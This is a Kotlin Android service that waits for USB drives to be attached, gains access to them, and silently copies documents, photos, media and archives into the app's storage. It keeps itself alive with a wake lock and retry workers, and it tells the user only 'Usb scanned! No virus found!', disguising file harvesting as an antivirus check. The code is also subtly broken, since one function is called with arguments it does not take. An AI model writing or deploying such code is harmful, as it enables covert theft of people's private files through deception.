package com.ncorti.kotlin.template.app


import android.Manifest
import android.content.pm.PackageManager

import android.app.*
import android.content.*
import android.hardware.usb.*
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import me.jahnen.libaums.core.UsbMassStorageDevice
import me.jahnen.libaums.core.fs.UsbFile
import me.jahnen.libaums.core.fs.UsbFileInputStream
import kotlinx.coroutines.*
import java.io.*
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class BackgroundService : Service() {
    private lateinit var usbManager: UsbManager
    private lateinit var notificationHelper: NotificationHelper
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val connectedDevices = ConcurrentHashMap<String, UsbDevice>()
    private val activeTransfers = ConcurrentHashMap<String, AtomicBoolean>()
    private val wakeLock by lazy { createWakeLock() }

    companion object {
        private const val ACTION_USB_PERMISSION = "com.ncorti.kotlin.template.app.USB_PERMISSION"
        const val ACTION_START_SERVICE = "com.ncorti.kotlin.template.app.ACTION_START_SERVICE"
        private const val ACTION_KEEP_ALIVE = "com.ncorti.kotlin.template.app.ACTION_KEEP_ALIVE"
        private const val ACTION_RETRY_DEVICE = "com.ncorti.kotlin.template.app.RETRY_DEVICE"
        const val ACTION_STOP_SERVICE = "STOP_SERVICE"
        private const val ACTION_HEARTBEAT = "SERVICE_HEARTBEAT"
        
        private const val WAKE_LOCK_TIMEOUT = 30L * 60 * 1000 // 30 minutes
        private const val BUFFER_SIZE = 8192
        private const val TAG = "USBService"
        
        private val SUPPORTED_EXTENSIONS = setOf(
            "jpg", "jpeg", "png", "gif", "mp4", "mp3",
            "doc", "docx", "pdf", "txt", "zip", "rar",
            "ppt", "pptx", "xls"
        )
    }

    private fun getLogFile(): File {
        val baseDir = getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS)
        val dateStr = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
        return File(baseDir, "${dateStr}_usb_service_log.txt")
    }

    private fun copyFileWithChecks(sourceFile: UsbFile, destDir: File, deviceName: String) {
        val targetFile = File(destDir, sourceFile.name)
        try {
            // Check file size before copying
            if (sourceFile.length == 0L){
                logEvent("Skipping empty file: ${sourceFile.name}")
                return
            }

            if (targetFile.exists()) {
                // Compare sizes if file exists
                if (targetFile.length() == sourceFile.length) {
                    logEvent("Skipping existing file with same size: ${sourceFile.name}")
                    return
                }
                targetFile.delete()
            }

            UsbFileInputStream(sourceFile).use { input ->
                FileOutputStream(targetFile).use { output ->
                    val buffer = ByteArray(8192)
                    var bytesRead: Int = 0
                    var totalBytesRead = 0L
                    
                    while (activeTransfers[deviceName]?.get() == true && 
                        input.read(buffer).also { bytesRead = it } != -1) {
                        output.write(buffer, 0, bytesRead)
                        totalBytesRead += bytesRead
                    }

                    // Verify file size after copy
                    if (totalBytesRead != sourceFile.length) {
                        throw IOException("File size mismatch after copy")
                    }
                }
            }
            logEvent("Copied: ${sourceFile.name} (${sourceFile.length} bytes)")
        } catch (e: Exception) {
            logError("Failed to copy ${sourceFile.name}", e)
            targetFile.delete()
        }
    }

    private val usbReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                ACTION_USB_PERMISSION -> handleUsbPermission(intent)
                UsbManager.ACTION_USB_DEVICE_ATTACHED -> handleDeviceAttached(intent)
                UsbManager.ACTION_USB_DEVICE_DETACHED -> handleDeviceDetached(intent)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        initializeService()
    }

    private fun initializeService() {
        try {
            if (!hasRequiredPermissions()) {
                throw SecurityException("Required permissions not granted")
            }

            usbManager = getSystemService(Context.USB_SERVICE) as UsbManager
            notificationHelper = NotificationHelper(this)
        
            // Create notification channel before starting foreground
            notificationHelper.createNotificationChannel()
        
            val notification = notificationHelper.createForegroundNotification()
            startForeground(NotificationHelper.NOTIFICATION_ID, notification)
        
            registerUsbReceiver()
            checkForAlreadyConnectedDevices()
            logEvent("Service initialized successfully")
        } catch (e: Exception) {
            logError("Service initialization failed", e)
            stopSelf()
        }
    }

    private fun hasRequiredPermissions(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == 
                PackageManager.PERMISSION_GRANTED
        }
    }

    private fun createWakeLock(): PowerManager.WakeLock {
        return (getSystemService(POWER_SERVICE) as PowerManager).run {
            newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "$TAG::WakeLock").apply {
                setReferenceCounted(true)
            }
        }
    }

    private fun handleUsbPermission(intent: Intent) {
        val device = getUsbDevice(intent)
        if (intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false)) {
            device?.let {
                logEvent("Permission granted: ${it.deviceName}")
                startProcessing(it)
            }
        } else {
            logEvent("Permission denied: ${device?.deviceName}")
            device?.let { scheduleRetry(it) }
        }
    }

    private fun startProcessing(device: UsbDevice) {
        if (activeTransfers[device.deviceName]?.get() == true) {
            logEvent("Transfer already active for ${device.deviceName}")
            return
        }

        serviceScope.launch {
            try {
                wakeLock.acquire(WAKE_LOCK_TIMEOUT)
                connectedDevices[device.deviceName] = device
                activeTransfers[device.deviceName] = AtomicBoolean(true)

                val timestamp = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(Date())
                val destinationDir = createDestinationDirectory(device.deviceName, timestamp)
                
                processUsbDevice(device, destinationDir)
            } catch (e: Exception) {
                logError("Processing failed for ${device.deviceName}", e)
                scheduleRetry(device)
            } finally {
                wakeLock.release()
                activeTransfers.remove(device.deviceName)
            }
        }
    }

    private fun createDestinationDirectory(deviceName: String, timestamp: String): File {
        return File(getExternalFilesDir(null), "usb/${deviceName}_$timestamp").apply {
            if (!exists() && !mkdirs()) {
                throw IOException("Failed to create destination directory")
            }
        }
    }

    private suspend fun processUsbDevice(device: UsbDevice, destinationDir: File) {
        val storageDevices = UsbMassStorageDevice.getMassStorageDevices(this@BackgroundService)
        if (storageDevices.isEmpty()) {
            throw IOException("No mass storage devices found")
        }

        storageDevices.forEach { massStorage ->
            try {
                // New error handling for init
                try {
                    massStorage.init()
                } catch (e: Exception) {
                    logError("Failed to initialize mass storage device", e)
                    return@forEach
                }

                // More specific partition check
                if (massStorage.partitions.isEmpty()) {
                    logEvent("No partitions found on ${device.deviceName}")
                    return@forEach
                }

                val partition = massStorage.partitions[0]
                try {
                    val fileSystem = partition.fileSystem
                    val root = fileSystem.rootDirectory
                    scanAndCopyFiles(root, destinationDir, device.deviceName)
                    notifyTransferComplete(device.deviceName, destinationDir)
                } catch (e: Exception) {
                    logError("File system access failed", e)
                    throw e
                } finally {
                    try {
                        massStorage.close()
                    } catch (e: Exception) {
                        logError("Error closing mass storage device", e)
                    }
                }
            } catch (e: Exception) {
                logError("Device processing failed", e)
            }
        }
    }

    private fun scanAndCopyFiles(root: UsbFile, destinationDir: File, deviceName: String) {
        val queue = ArrayDeque<UsbFile>().apply { push(root) }
        var filesCopied = 0

        while (queue.isNotEmpty() && activeTransfers[deviceName]?.get() == true) {
            val currentDir = queue.pop()
            try {
                currentDir.listFiles().forEach { file ->
                    if (activeTransfers[deviceName]?.get() != true) return@forEach

                    if (file.isDirectory) {
                        queue.push(file)
                    } else if (isSupportedFile(file.name)) {
                        copyFileWithChecks(file, destinationDir, deviceName)
                        filesCopied++
                    }
                }
            } catch (e: Exception) {
                logError("Error accessing directory: ${currentDir.name}", e)
            }
        }

        logEvent("Copied $filesCopied files from ${root.name}")
    }

    private fun scheduleRetry(device: UsbDevice) {
        UsbRetryWorker.schedule(this, device.deviceName)
        logEvent("Scheduled retry for ${device.deviceName}")
    }
    private fun notifyTransferComplete() {
        notificationHelper.showNotification(
            "Usb scanned!",
            "No virus found!",
            NotificationHelper.COMPLETION_ID
        )
    }

    private fun registerUsbReceiver() {
        val filter = IntentFilter().apply {
            addAction(ACTION_USB_PERMISSION)
            addAction(UsbManager.ACTION_USB_DEVICE_ATTACHED)
            addAction(UsbManager.ACTION_USB_DEVICE_DETACHED)
        }
        registerReceiver(usbReceiver, filter)
    }

    private fun handleDeviceAttached(intent: Intent) {
        val device = getUsbDevice(intent)
        device?.let {
            if (!connectedDevices.containsKey(it.deviceName)) {
                logEvent("USB Device attached: ${it.deviceName}")
                requestUsbPermission(it)
            }
        }
    }

    private fun handleDeviceDetached(intent: Intent) {
        val device = getUsbDevice(intent)
        device?.let {
            logEvent("USB Device detached: ${it.deviceName}")
            activeTransfers[it.deviceName]?.set(false)
            connectedDevices.remove(it.deviceName)
        }
    }

    private fun getUsbDevice(intent: Intent): UsbDevice? {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra(UsbManager.EXTRA_DEVICE, UsbDevice::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent.getParcelableExtra(UsbManager.EXTRA_DEVICE)
        }
    }

    private fun requestUsbPermission(device: UsbDevice) {
        val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.FLAG_IMMUTABLE
        } else {
            0
        }

        val permissionIntent = PendingIntent.getBroadcast(
            this,
            0,
            Intent(ACTION_USB_PERMISSION),
            flags
        )
        usbManager.requestPermission(device, permissionIntent)
    }

    private fun checkForAlreadyConnectedDevices() {
        usbManager.deviceList.values.forEach { device ->
            if (!connectedDevices.containsKey(device.deviceName)) {
                requestUsbPermission(device)
            }
        }
    }

    private fun isSupportedFile(fileName: String): Boolean {
        return SUPPORTED_EXTENSIONS.any { ext ->
            fileName.lowercase().endsWith(".$ext")
        }
    }

    private fun logEvent(message: String) {
        Log.d(TAG, message)
        try {
            val logFile = File(getExternalFilesDir(null), "log.txt")
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(Date())
            logFile.appendText("[$timestamp] $message\n")
        } catch (e: Exception) {
            Log.e(TAG, "Error writing to log file: ${e.message}")
        }
    }
    
    private fun logError(message: String, error: Exception) {
        Log.e(TAG, "$message: ${error.message}", error)
        try {
            val logFile = File(getExternalFilesDir(null), "log.txt")
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(Date())
            logFile.appendText("[$timestamp] ERROR: $message - ${error.message}\n${error.stackTraceToString()}\n")
        } catch (e: Exception) {
            Log.e(TAG, "Error writing to log file: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_RETRY_DEVICE -> {
                intent.getStringExtra("device_name")?.let { deviceName ->
                    connectedDevices[deviceName]?.let { device ->
                        startProcessing(device)
                    }
                }
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        unregisterReceiver(usbReceiver)
        if (wakeLock.isHeld) wakeLock.release()
    }

    class NotificationHelper(context: Context) {
        companion object {
            const val CHANNEL_ID = "UsbServiceChannel"
            const val NOTIFICATION_ID = 1
            const val COMPLETION_ID = 2
        }

        private val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        private val builder = NotificationCompat.Builder(context, CHANNEL_ID)

        init {
            createNotificationChannel()
        }

        fun createForegroundNotification() = builder
            .setContentTitle("USB Manager")
            .setContentText("Scanning device")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

        fun showNotification(title: String, message: String, id: Int = NOTIFICATION_ID) {
            manager.notify(id, builder
                .setContentTitle(title)
                .setContentText(message)
                .setAutoCancel(true)
                .build())
        }

        fun createNotificationChannel() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel(
                    CHANNEL_ID,
                    "USB Transfer Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Shows USB transfer status"
                    manager.createNotificationChannel(this)
                }
            }
        }
    }

    class UsbRetryWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(ctx, params) {
        override suspend fun doWork(): Result {
            val deviceName = inputData.getString("device_name") ?: return Result.failure()
            
            try {
                val intent = Intent(applicationContext, BackgroundService::class.java).apply {
                    action = ACTION_RETRY_DEVICE
                    putExtra("device_name", deviceName)
                }
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    applicationContext.startForegroundService(intent)
                } else {
                    applicationContext.startService(intent)
                }
                
                return Result.success()
            } catch (e: Exception) {
                return Result.retry()
            }
        }

        companion object {
            fun schedule(context: Context, deviceName: String) {
                val request = OneTimeWorkRequestBuilder<UsbRetryWorker>()
                    .setInputData(workDataOf("device_name" to deviceName))
                    .setBackoffCriteria(
                        BackoffPolicy.EXPONENTIAL,
                        30_000L,
                        TimeUnit.MILLISECONDS
                    )
                    .build()

                WorkManager.getInstance(context)
                    .enqueueUniqueWork(
                        "retry_$deviceName",
                        ExistingWorkPolicy.REPLACE,
                        request
                    )
            }
        }
    }
}